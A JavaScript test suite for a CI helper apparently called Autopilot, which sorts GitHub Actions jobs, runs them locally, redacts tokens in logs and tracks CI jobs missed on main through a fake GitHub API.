  assert.deepEqual(sortCiJobs({ files: [file('ci.yml', `${ON_PR}jobs:\n  t:\n    runs-on: ubuntu-latest\n    steps:\n      - run: pytest -v\n`)], testCommand: 'make test', machine: LINUX }).jobs[0].commands, ['pytest -v']);
  assert.deepEqual(oneJob('      - run: ./scripts/e2e.sh --version\n').commands, ['./scripts/e2e.sh --version']);
  for (const command of ['node -v', 'python3 -V', 'go version', 'pytest --version']) assert.equal(oneJob(`      - run: ${command}\n`).why, 'runs only setup steps', command);
});

test('sort: the events of the PR head decide a job condition; pull_request_target and toJSON(secrets) are CI-only; local runs get GITHUB_SHA and GITHUB_BASE_REF', () => {
  // A push-only workflow runs on the job branch's own pushes: its push-only job is PR CI.
  const push = sort([file('push.yml', "on:\n  push:\njobs:\n  t:\n    if: github.event_name == 'push'\n    runs-on: ubuntu-latest\n    steps:\n      - run: npm run lint\n")]);
  assert.deepEqual([push.jobs.map(job => [job.check, job.kind]), push.dropped], [[['t', 'local']], []]);
  const target = sort([file('t.yml', "on:\n  pull_request_target:\njobs:\n  t:\n    runs-on: ubuntu-latest\n    steps:\n      - run: npm run lint\n")]).jobs[0];
  assert.deepEqual([target.kind, target.need], ['ci-only', 'pull_request_target']);
  assert.equal(oneJob('      - uses: actions/checkout@v4\n        with:\n          token: ${{ toJSON(secrets) }}\n      - run: npm run lint\n').need, 'secrets');
  const [plan] = localJobPlan({ jobs: [oneJob('      - run: git diff --exit-code origin/$GITHUB_BASE_REF -- package-lock.json\n')], head: HEAD, base: 'main', checkout: '/w/co', temp: '/w/tmp', machine: LINUX });
  assert.deepEqual([plan.env.GITHUB_SHA, plan.env.GITHUB_BASE_REF], [HEAD, 'main']);
});

const lintOnly = sort([file('ci.yml', `${ON_PR}jobs:\n  tests:\n    runs-on: ubuntu-latest\n    steps:\n      - run: npm test\n      - run: npm run lint\n  codeql:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: github/codeql-action/analyze@v3\n`)]).jobs;

test('local jobs: the plan runs each step in order with CI=true and the GitHub folders; the record reads pass, fail and a missing tool', t => {
  const dir = temp(t), checkout = join(dir, 'checkout'), scratch = join(dir, 'tmp');
  mkdirSync(join(checkout, 'sub'), { recursive: true });
  const job = (id, body) => `  ${id}:\n    runs-on: ubuntu-latest\n    steps:\n${body}`;
  const ci = `${ON_PR}jobs:\n`
    + job('good', '      - name: Write\n        run: echo "$CI $GREETING" > "$RUNNER_TEMP/out.txt" && cp "$RUNNER_TEMP/out.txt" "$GITHUB_WORKSPACE/out.txt"\n        env:\n          GREETING: it\'s ${{ runner.os }}\n      - run: test "$(pwd)" = "$GITHUB_WORKSPACE/sub" && echo ok >> "$GITHUB_STEP_SUMMARY"\n        working-directory: sub\n        shell: sh\n')
    + job('bad', '      - run: ls > /dev/null\n      - name: Break\n        run: |\n          ls > /dev/null\n          echo "token ghp_' + 'a'.repeat(36) + '"\n          exit 3\n      - run: ls never-here\n')
    + job('tool', '      - run: pdd-ci-jobs-no-such-tool --check\n');
  const jobs = sort([file('ci.yml', ci)]).jobs, plan = localJobPlan({ jobs, head: HEAD, checkout, temp: scratch, machine: LINUX });
  assert.deepEqual(plan.map(entry => [entry.key, entry.cwd, entry.env.CI, entry.env.GITHUB_WORKSPACE, entry.env.RUNNER_TEMP]), [
    ['ci.yml#good#0', checkout, 'true', checkout, join(scratch, 'job-1', 'runner-temp')], ['ci.yml#bad#0', checkout, 'true', checkout, join(scratch, 'job-2', 'runner-temp')],
    ['ci.yml#tool#0', checkout, 'true', checkout, join(scratch, 'job-3', 'runner-temp')]]);
  assert.deepEqual(plan[0].steps.map(step => [step.name, step.command, step.args.slice(0, -1), step.cwd]), [['Write', 'bash', ['-e', '-c'], checkout], ['test "$(pwd)" = "$GITHUB_WORKSPACE/sub" && echo ok >> "$GITHUB_STEP_SUMMARY"', 'sh', ['-e', '-c'], join(checkout, 'sub')]]);
  const runs = {};
  for (const entry of plan) {
    const r = spawnSync('/bin/bash', ['-c', entry.command], { cwd: entry.cwd, encoding: 'utf8', env: { PATH: process.env.PATH, HOME: process.env.HOME, ...entry.env } });
    runs[entry.key] = { exit: { code: r.status, signal: r.signal }, log: `${r.stdout}${r.stderr}` };
  }
  assert.equal(readFileSync(join(checkout, 'out.txt'), 'utf8'), "true it's Linux\n");
  assert.equal(readFileSync(plan[0].env.GITHUB_STEP_SUMMARY, 'utf8'), 'ok\n');
  assert.match(runs['ci.yml#good#0'].log, /pdd-ci-local: all 2 steps passed/);
  assert.doesNotMatch(runs['ci.yml#bad#0'].log, /never/);
  const record = localJobsRecord({ head: HEAD, plan, runs, at: 5 });
  assert.deepEqual(record.jobs.map(row => [row.check, row.state, row.step, row.exit, row.tool]), [['good', 'pass', null, null, null], ['bad', 'fail', 'Break', 3, null], ['tool', 'could-not-run', 'pdd-ci-jobs-no-such-tool --check', 127, 'pdd-ci-jobs-no-such-tool']]);
  assert.equal(record.jobs[2].why, 'pdd-ci-jobs-no-such-tool is missing on this machine');
  assert.match(record.jobs[1].tail, /token \[redacted\]/);
  assert.doesNotMatch(record.jobs[1].tail, /ghp_/);
  const reds = localJobReds(record);
  assert.equal(reds.length, 1);
  assert.ok(reds[0].startsWith(`CI job bad failed when Autopilot ran it on this machine for head ${HEAD.slice(0, 7)} (CI did not start): step "Break" exited with 3.\nLast lines:\n`));
  // No run, or a run killed by a signal: could not run (it counts as CI-only, never as a pass).
  assert.deepEqual(localJobResult(plan[0], null).state, 'could-not-run');
  assert.equal(localJobResult(plan[0], { exit: { code: null, signal: 'SIGKILL' }, log: '' }).why, 'the local run did not finish (SIGKILL)');
  assert.throws(() => localJobPlan({ jobs, head: 'HEAD', checkout, temp: scratch }), /head must be 40 hex digits/);
  assert.throws(() => localJobPlan({ jobs, head: HEAD, checkout: 'relative', temp: scratch }), /absolute paths/);
});

test('merge note: CI did not start, the covered jobs, each local result and each CI-only job (the design\'s lines)', () => {
  const plan = localJobPlan({ jobs: lintOnly, head: HEAD, checkout: '/w/co', temp: '/w/tmp', machine: LINUX });
  const record = localJobsRecord({ head: HEAD, plan, runs: { 'ci.yml#tests#0': { exit: { code: 0 }, log: '' } } });
  const covered = sort([file('ci.yml', `${ON_PR}jobs:\n  tests:\n    runs-on: ubuntu-latest\n    steps:\n      - run: npm test\n  lint:\n    runs-on: ubuntu-latest\n    steps:\n      - run: npm run lint\n  codeql:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: github/codeql-action/analyze@v3\n`)]).jobs;
  const lintPlan = localJobPlan({ jobs: covered, head: HEAD, checkout: '/w/co', temp: '/w/tmp', machine: LINUX });
  const passed = localJobsRecord({ head: HEAD, plan: lintPlan, runs: { 'ci.yml#lint#0': { exit: { code: 0 }, log: '' } } });
  assert.deepEqual(ciMergeNote({ jobs: covered, record: passed, notStarted: { reason: 'queued', since: Date.UTC(2026, 10, 11, 20, 20) } }), [
    '- CI: did not start (queued since 20:20 UTC); covered by the local full suite: tests', '- CI job lint: local pass', '- CI job codeql: not run yet (CI did not start)']);
  // A local job with the full suite inside is covered and local; a missing result is "not run yet".
  assert.deepEqual(ciMergeNote({ jobs: lintOnly, record: localJobsRecord({ head: HEAD, plan, runs: {} }), notStarted: { reason: 'billing', message: 'The job was not started because your account is locked due to a billing issue.' } }), [
    '- CI: did not start (GitHub said "The job was not started because your account is locked due to a billing issue."); covered by the local full suite: tests',
    '- CI job tests: the full suite is covered; the other steps: not run yet (CI did not start; the local run did not finish)', '- CI job codeql: not run yet (CI did not start)']);
  assert.equal(record.jobs[0].state, 'pass');
  assert.deepEqual(ciMergeNote({ jobs: [], notStarted: null }), ['- CI: did not start (reason unknown)']);
});

test('missed CI: the record holds the CI-only jobs and the local jobs that could not run, never a passed one', t => {
  const state = temp(t);
  const plan = localJobPlan({ jobs: lintOnly, head: HEAD, checkout: '/w/co', temp: '/w/tmp', machine: LINUX });
  const missed = missedCiJobs({ jobs: lintOnly, record: localJobsRecord({ head: HEAD, plan, runs: { 'ci.yml#tests#0': { exit: { code: 127 }, log: 'bash: line 1: npm: command not found\n' } } }) });
  // ON_PR has a push to main and no workflow_dispatch; both jobs are test jobs that do not deploy.
  assert.deepEqual(missed, [{ key: 'ci.yml#tests#0', workflow: 'ci.yml', job: 'tests', checks: ['tests'], onBase: true, dispatch: false, rerun: true, duplicate: false },
    { key: 'ci.yml#codeql#ci', workflow: 'ci.yml', job: 'codeql', checks: ['codeql'], onBase: true, dispatch: false, rerun: true, duplicate: false }]);
  assert.deepEqual(missedCiJobs({ jobs: lintOnly, record: localJobsRecord({ head: HEAD, plan, runs: { 'ci.yml#tests#0': { exit: { code: 0 } } } }) }).map(job => job.job), ['codeql']);
  assert.equal(recordMissedCi({ root: state, merge: MERGE, pr: 4, issue: 3, missed: [] }), null);
  assert.ok(!existsSync(join(state, 'ci-missed.jsonl')));
  writeFileSync(join(state, 'ci-missed.jsonl'), '{"cut":');
  recordMissedCi({ root: state, merge: MERGE, pr: 4, issue: 3, missed }, { now: () => 10 });
  assert.deepEqual(readMissedCi({ root: state }), [{ merge: MERGE, pr: 4, issue: 3, at: 10, jobs: missed.map(job => ({ ...job, state: 'missed' })) }]);
  assert.throws(() => recordMissedCi({ root: state, merge: 'main', missed }), /merge must be 40 hex digits/);
});

// A fake GitHub for the missed-CI check: check runs per commit, workflow runs per commit, and the POSTs it got.
function fakeGitHub() {
  const g = { checks: new Map(), runs: new Map(), issues: new Map(), posts: [], reads: 0, status: new Map() };
  g.call = async (method, endpoint, body) => {
    if (method === 'POST') { g.posts.push({ endpoint, body }); return { status: g.status.get(endpoint) ?? 201, value: {} }; }
    g.reads++;
    let m;
    if ((m = /^repos\/o\/r\/commits\/(\w+)\/check-runs/.exec(endpoint))) return { status: 200, value: { check_runs: g.checks.get(m[1]) ?? [] } };
    if ((m = /^repos\/o\/r\/actions\/runs\?head_sha=(\w+)/.exec(endpoint))) return { status: 200, value: { workflow_runs: g.runs.get(m[1]) ?? [] } };
    if ((m = /^repos\/o\/r\/issues\/(\d+)$/.exec(endpoint))) return g.issues.has(Number(m[1])) ? { status: 200, value: g.issues.get(Number(m[1])) } : { status: 404 };
    return { status: 404 };
  };
  return g;
}
// A missed CI-only test job (CodeQL) of a workflow with a push to main and workflow_dispatch, as missedCiJobs gives it.
const missedCodeql = [{ key: 'codeql.yml#analyze#0', workflow: 'codeql.yml', job: 'analyze', checks: ['Analyze (javascript)'], onBase: true, dispatch: true, rerun: true, duplicate: false }];
const check = (root, tip, ports) => checkMissedCi({ root, repo: 'o/r', base: 'main', tip }, ports);
const HOUR = 60 * 60 * 1000;

test('missed CI on main: no call while CI is down; a billing failure gets one rerun of that job only; a pass drops the record', async t => {
  const state = temp(t), gh = fakeGitHub();
  let now = 1000;
  const ports = { gh, now: () => now, billing: async run => /spending limit/.test(run.output?.title ?? '') ? 'the spending limit' : null };
  recordMissedCi({ root: state, merge: MERGE, pr: 9, issue: 8, missed: missedCodeql }, ports);
  const down = await checkMissedCi({ root: state, repo: 'o/r', base: 'main', tip: TIP, ciDown: { since: 1, reason: 'queued' } }, ports);
  assert.equal(gh.reads, 0);
  assert.deepEqual([down.state, down.lines], ['waiting', [`missed CI: CI job Analyze (javascript) for PR #9 (${MERGE.slice(0, 7)}) waits to run on main`]]);
  // CI works again. The merge commit's job failed on the spending limit: GitHub did not run it, so it is rerun once.
  gh.checks.set(MERGE, [{ id: 5, name: 'Analyze (javascript)', status: 'completed', conclusion: 'failure', output: { title: 'The job was not started because of the spending limit' } }]);
  gh.runs.set(MERGE, [{ id: 77, path: '.github/workflows/codeql.yml', status: 'completed', conclusion: 'failure' }]);
  assert.equal((await check(state, TIP, ports)).state, 'waiting');
  // Claude review 9: only the missed job, never the whole workflow run.
  assert.deepEqual(gh.posts, [{ endpoint: 'repos/o/r/actions/jobs/5/rerun', body: undefined }]);
  now += 60_000;
  await check(state, TIP, ports);
  assert.equal(gh.posts.length, 1, 'one rerun only');
  gh.checks.set(MERGE, [...gh.checks.get(MERGE), { id: 6, name: 'Analyze (javascript)', status: 'completed', conclusion: 'success' }]);
  const passed = await check(state, TIP, ports);
  assert.deepEqual([passed.state, passed.red, passed.lines], ['clear', [], []]);
  assert.deepEqual(readMissedCi({ root: state }), []);
});

test('missed CI on main: a failure is "main is red"; the hold ends when the check passes at the base tip or its main-red issue closes', async t => {
  const state = temp(t), gh = fakeGitHub(), ports = { gh, now: () => 5000 };
  recordMissedCi({ root: state, merge: MERGE, pr: 9, issue: 8, missed: missedCodeql }, ports);
  gh.checks.set(MERGE, [{ id: 5, name: 'Analyze (javascript)', status: 'completed', conclusion: 'failure', output: { title: 'Found 2 alerts' } }]);
  const red = await check(state, TIP, ports);
  assert.equal(red.state, 'red');
  assert.deepEqual(red.red, [{ key: 'codeql.yml#analyze#0', merge: MERGE, pr: 9, issue: 8, workflow: 'codeql.yml', names: ['Analyze (javascript)'], sha: MERGE }]);
  assert.equal(gh.posts.length, 0, 'a real failure is not rerun');
  assert.equal(missedCiHeldLine(red.red[0], 'main', 41), 'merges held: CI job Analyze (javascript) failed on main after a merge without CI (issue #41)');
  // Still red at the base tip: the hold stays. Then the check passes at a later tip: the record goes.
  gh.checks.set(TIP, [{ id: 9, name: 'Analyze (javascript)', status: 'completed', conclusion: 'failure' }]);
  assert.equal((await check(state, TIP, ports)).state, 'red');
  const fixed = 'd'.repeat(40);
  gh.checks.set(fixed, [{ id: 12, name: 'Analyze (javascript)', status: 'completed', conclusion: 'success' }]);
  assert.equal((await check(state, fixed, ports)).state, 'clear');
  // Claude review 8: the caller saves the main-red issue; when a person closes it, the hold ends.
  const other = temp(t);
  recordMissedCi({ root: other, merge: MERGE, pr: 9, issue: 8, missed: missedCodeql }, ports);
  await check(other, TIP, ports);
  assert.equal(noteMissedRedIssue({ root: other, merge: MERGE, key: 'codeql.yml#analyze#0', issue: 41 }), true);
  gh.issues.set(41, { state: 'open' });
  assert.equal((await check(other, TIP, ports)).state, 'red');
  gh.issues.set(41, { state: 'closed' });
  assert.equal((await check(other, TIP, ports)).state, 'clear');
});

test('Claude review 7: a cancelled, stale or action_required run on the merge commit is no result, never "main is red"', async t => {
  for (const conclusion of ['cancelled', 'stale', 'action_required']) {
    const state = temp(t), gh = fakeGitHub(), ports = { gh, now: () => 0 };
    recordMissedCi({ root: state, merge: MERGE, pr: 1, issue: 2, missed: missedCodeql }, ports);
    gh.checks.set(MERGE, [{ id: 1, name: 'Analyze (javascript)', status: 'completed', conclusion }]);
    gh.checks.set(TIP, [{ id: 2, name: 'Analyze (javascript)', status: 'in_progress', conclusion: null }]);
    assert.deepEqual([(await check(state, TIP, ports)).state, gh.posts], ['waiting', []], conclusion);
    gh.checks.set(TIP, [{ id: 2, name: 'Analyze (javascript)', status: 'completed', conclusion: 'success' }]);
    assert.equal((await check(state, TIP, ports)).state, 'clear', conclusion);
  }
});

test('Claude review 8: a red hold asks once more when the base moved, then stops holding; a job with no dispatch stops at once', async t => {
  const state = temp(t), gh = fakeGitHub(), T2 = 'd'.repeat(40), T3 = 'e'.repeat(40);
  let now = 0;
  const ports = { gh, now: () => now };
  recordMissedCi({ root: state, merge: MERGE, pr: 1, issue: 2, missed: missedCodeql }, ports);
  gh.checks.set(TIP, [{ id: 3, name: 'Analyze (javascript)', status: 'completed', conclusion: 'failure' }]);
  assert.equal((await check(state, TIP, ports)).state, 'red');
  // The base moves; its new tip has no run of that check: one dispatch there, and the job waits for it (still a hold).
  now += HOUR;
  assert.equal((await check(state, T2, ports)).state, 'red');
  assert.deepEqual(gh.posts, [{ endpoint: 'repos/o/r/actions/workflows/codeql.yml/dispatches', body: { ref: 'main' } }]);
  // No result 6 hours later: stuck, no hold, no second ask.
  now += 6 * HOUR;
  const after = await check(state, T3, ports);
  assert.deepEqual([after.state, after.red, after.stuck.map(row => row.why), gh.posts.length], ['waiting', [], ['the base moved and Autopilot cannot run it again there'], 1]);
  const other = temp(t);
  recordMissedCi({ root: other, merge: MERGE, pr: 1, issue: 2, missed: [{ ...missedCodeql[0], dispatch: false }] }, ports);
  await check(other, TIP, ports);
  assert.deepEqual([(await check(other, T2, ports)).state, gh.posts.length], ['waiting', 1]);
});

test('Claude review 8 and I5: a job that a push to main does not run, or that GitHub skipped there, never ran: no ask, no hold', async t => {
  const wf = "on:\n  pull_request:\n  push:\n    branches: [main]\njobs:\n  review:\n    if: github.event_name == 'pull_request'\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/dependency-review-action@v4\n";
  const noPush = 'on:\n  pull_request:\n  workflow_dispatch:\njobs:\n  lint:\n    runs-on: macos-latest\n    steps:\n      - run: npm run lint\n';
  const jobs = sort([file('dep.yml', wf), file('lint.yml', noPush)]).jobs;
  assert.deepEqual(jobs.map(job => [job.check, job.kind, job.onBase]), [['review', 'ci-only', false], ['lint', 'ci-only', false]]);
  const state = temp(t), gh = fakeGitHub(), ports = { gh, now: () => 0 };
  recordMissedCi({ root: state, merge: MERGE, pr: 1, issue: 2, missed: missedCiJobs({ jobs }) }, ports);
  const r = await check(state, TIP, ports);
  assert.deepEqual([r.state, r.red, r.never.map(row => row.workflow), gh.reads, gh.posts], ['waiting', [], ['dep.yml', 'lint.yml'], 0, []]);
  assert.ok(r.lines.includes(`missed CI: CI job review for PR #1 (${MERGE.slice(0, 7)}) never ran on main (its workflow does not run on a push to main)`));
  // A job that can run on main, but GitHub skipped it at the merge commit: never ran, not passed.
  const other = temp(t);
  recordMissedCi({ root: other, merge: MERGE, pr: 1, issue: 2, missed: missedCodeql }, ports);
  gh.checks.set(MERGE, [{ id: 1, name: 'Analyze (javascript)', status: 'completed', conclusion: 'skipped' }]);
  const skipped = await check(other, TIP, ports);
  assert.deepEqual([skipped.state, skipped.never.map(row => row.why), gh.posts], ['waiting', ['GitHub skipped it on main'], []]);
});

test('Claude review 9: a push-only deploy job is no PR CI; a job that deploys or uses secrets is never run again', async t => {
  const wf = "on:\n  pull_request:\n  push:\n    branches: [main]\njobs:\n  test:\n    runs-on: ubuntu-latest\n    steps:\n      - run: npm test\n"
    + "  deploy:\n    needs: test\n    if: github.event_name == 'push'\n    environment: production\n    runs-on: ubuntu-latest\n    steps:\n      - run: ./deploy.sh\n"
    + '  e2e:\n    runs-on: macos-latest\n    steps:\n      - run: npm run e2e\n        env:\n          TOKEN: ${{ secrets.E2E }}\n';
  const result = sort([file('ci.yml', wf)]);
  assert.deepEqual(result.jobs.map(job => [job.check, job.kind, job.rerun]), [['test', 'covered', true], ['e2e', 'ci-only', false]]);
  assert.deepEqual(result.dropped, [{ workflow: 'ci.yml', job: 'deploy', why: "its condition is false for a PR head (github.event_name == 'push')" }]);
  const state = temp(t), gh = fakeGitHub(), ports = { gh, now: () => 0 };
  recordMissedCi({ root: state, merge: MERGE, pr: 1, issue: 2, missed: missedCiJobs({ jobs: result.jobs }) }, ports);
  gh.checks.set(MERGE, [{ id: 4, name: 'e2e', status: 'completed', conclusion: 'cancelled' }]);
  gh.runs.set(MERGE, [{ id: 9, path: '.github/workflows/ci.yml', status: 'completed' }]);
  const r = await check(state, TIP, ports);
  assert.deepEqual([r.state, r.stuck.map(row => row.why), gh.posts], ['waiting', ['Autopilot runs again only a test job that does not deploy'], []]);
});

test('missed CI on main: a dispatch result counts where it ran; two jobs with one check name are never decided by name', async t => {
  const state = temp(t), gh = fakeGitHub(), T2 = 'd'.repeat(40);
  let now = 0;
  const ports = { gh, now: () => now };
  recordMissedCi({ root: state, merge: MERGE, pr: 9, issue: 8, missed: [...missedCodeql, { key: 'mac.yml#mac#ci', workflow: 'mac.yml', job: 'mac', checks: ['test (macos-latest)'], onBase: true, dispatch: false, rerun: true, duplicate: false }] }, ports);
  const first = await check(state, TIP, ports);
  assert.deepEqual(gh.posts, [{ endpoint: 'repos/o/r/actions/workflows/codeql.yml/dispatches', body: { ref: 'main' } }]);
  assert.ok(first.lines.includes(`missed CI: CI job test (macos-latest) for PR #9 (${MERGE.slice(0, 7)}) did not run on main, and Autopilot cannot start it (no run to start): run the workflow mac.yml by hand`));
  // The dispatch ran at TIP and passed there; the base moved to T2 in the meantime (Claude review P3).
  gh.checks.set(TIP, [{ id: 20, name: 'Analyze (javascript)', status: 'completed', conclusion: 'success' }]);
  now += HOUR;
  const later = await check(state, T2, ports);
  assert.deepEqual([later.waiting, later.stuck.map(row => row.workflow)], [[], ['mac.yml']]);
  // A person's run of the stuck job at the tip counts: a red there is red.
  gh.checks.set(T2, [{ id: 21, name: 'test (macos-latest)', status: 'completed', conclusion: 'failure' }]);
  const byHand = await check(state, T2, ports);
  assert.deepEqual(byHand.red.map(row => [row.workflow, row.names, row.sha]), [['mac.yml', ['test (macos-latest)'], T2]]);
  assert.equal(gh.posts.length, 1);
  // Claude review 4: a duplicate check name is stuck at once with no call.
  const other = temp(t), gh2 = fakeGitHub();
  recordMissedCi({ root: other, merge: MERGE, pr: 1, issue: 2, missed: [{ ...missedCodeql[0], duplicate: true }] }, ports);
  const dup = await check(other, TIP, { gh: gh2, now: () => 0 });
  assert.deepEqual([dup.stuck.map(row => row.why), gh2.reads, gh2.posts], [['it shares its check name with another job'], 0, []]);
});

test('missed CI on main: a refused ask is stuck; a queued run waits with no ask; a GitHub read error throws and keeps the file', async t => {
  const other = temp(t), gh2 = fakeGitHub();
  gh2.status.set('repos/o/r/actions/jobs/3/rerun', 403);
  gh2.checks.set(MERGE, [{ id: 3, name: 'Analyze (javascript)', status: 'completed', conclusion: 'cancelled' }]);
  recordMissedCi({ root: other, merge: MERGE, pr: 1, issue: 2, missed: missedCodeql }, { now: () => 0 });
  assert.deepEqual((await check(other, TIP, { gh: gh2, now: () => 0 })).stuck.map(row => row.why), ['GitHub refused the ask (403)']);
  const third = temp(t), gh3 = fakeGitHub();
  gh3.runs.set(MERGE, [{ id: 4, path: '.github/workflows/codeql.yml', status: 'queued' }]);
  recordMissedCi({ root: third, merge: MERGE, pr: 1, issue: 2, missed: missedCodeql }, { now: () => 0 });
  assert.equal((await check(third, TIP, { gh: gh3, now: () => 0 })).state, 'waiting');
  assert.equal(gh3.posts.length, 0);
  await assert.rejects(check(third, TIP, { gh: { call: async () => ({ status: 502 }) }, now: () => 0 }), error => error.code === 'github');
  assert.equal(readMissedCi({ root: third }).length, 1);
});
